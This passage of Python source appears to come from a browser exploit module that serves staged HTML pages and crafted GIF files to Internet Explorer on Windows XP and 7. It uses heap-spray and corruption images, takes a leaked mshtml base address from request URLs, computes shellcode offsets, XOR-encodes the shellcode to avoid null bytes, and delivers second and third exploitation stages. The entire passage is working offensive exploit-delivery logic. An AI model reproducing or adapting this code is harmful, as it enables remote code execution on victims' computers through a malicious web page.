                self.create_shellcode()
                html = self.generate_html_winxp()

            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.endswith('.gif'):
            gif_file = ""
            if clientheader.URL.endswith('spray.gif'):
                self.log('Serving GIF spray file')
                gif_file = self.spray_gif
            elif clientheader.URL.endswith('pad.gif'):
                self.log('Serving GIF pad file')
                gif_file = self.pad_gif
            elif clientheader.URL.endswith('leak1.gif'):
                self.log('Serving GIF leak1 file')
                gif_file = self.leak_1_gif
            elif clientheader.URL.endswith('leak2.gif'):
                self.log('Serving GIF leak2 file')
                gif_file = self.leak_2_gif
            elif clientheader.URL.endswith('corrupt_xp.gif'):
                self.log('Serving GIF win xp corruption file')
                gif_file = self.corrupt_xp_gif
            elif clientheader.URL.endswith('corrupt_7.gif'):
                self.log('Serving GIF win 7 corruption file')
                gif_file = self.corrupt_7_gif

            a = open(gif_file, "rb")
            gif = a.read()
            a.close()

            b.setBody(gif)
            h.addHeader('Content-Type',  'image/gif')
            # h.addHeader('Expires',       'Tue, 1 Jan 3000 00:00:00 GMT')
            # h.addHeader('Cache-Control', 'max-age=31536000, public')

        elif clientheader.URL.endswith('addr1'):
            # we got mshtml base, start second stage
            leaked_pointer = int(clientheader.URL.split(".")[0].replace("/", ""))
            self.log("mshtml base: 0x%x" % leaked_pointer)
            self.log("shellcode 1st dword: 0x%x" % (leaked_pointer + 0x351404))
            self.log("shellcode 2nd dword: 0x%x" % (leaked_pointer + 0x339219))

            self.log('Serving second stage HTML')

            # cloneNode() truncates null bytes on clones
            badstring = '\0'
            self.create_shellcode()

            encoder = xorencoder.simpleXOR()
            encoder.setbadstring(badstring)
            ret = encoder.find_key(self.shellcode)

            if not ret:
                self.log("Could not generate a xor key for this shellcode")
                raise Exception, "XOR key not generated"

            self.shellcode = encoder.encode(self.shellcode)
            html = self.generate_html_second_stage_win7(leaked_pointer)

            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.endswith('addr2'):
            # we got shellcode addr, start third stage
            leaked_pointer = int(clientheader.URL.split(".")[0].replace("/", ""))
            self.log("Shellcode @ 0x%x" % leaked_pointer)

            self.log('Serving third stage HTML')

            html = self.generate_html_third_stage_win7(leaked_pointer)

            b.setBody(html)
            h.addHeader('Content-Type','text/html')

        elif clientheader.URL.count("exit"):
            self.log('Max retries reached. Exploit failed.')
            h.status='302'
            h.addHeader('Location',"http://www.google.com")
            h.addHeader('Content-Type','text/html')
            return h, b

        else:
            self.log('Redirecting to self')
            h.status='302'
            h.addHeader('Location', self.filename)
            h.addHeader('Content-Type','text/html')

        return h, b

    def run(self):
        # self.use_leak = True
        badstring = '\0'
        self.create_shellcode()

        # encoder = xorencoder.simpleXOR()
        # encoder.setbadstring(badstring)
        # ret = encoder.find_key(self.shellcode)

        # if not ret:
        #     self.log("Could not generate a xor key for this shellcode")
        #     raise Exception, "XOR key not generated"

        # self.shellcode = encoder.encode(self.shellcode)

        html = self.generate_html_winxp()
        #html = self.generate_html_first_stage_win7()
        #html = self.generate_html_second_stage_win7(0x71900000) # XXX:
        #html = self.generate_html_third_stage_win7(0x41424344) # XXX:
        self.log('Opening %s for output' % (self.filename))

        fd = file(self.filename,'wb+')
        fd.write(html)
        fd.close()
        self.log('Wrote to %s' % (self.filename))

        return 1

if __name__ == '__main__':
    exp = theexploit()
    ret = standard_callback_commandline(exp)
    if ret not in [0, 1, None]:
        ret.interact()
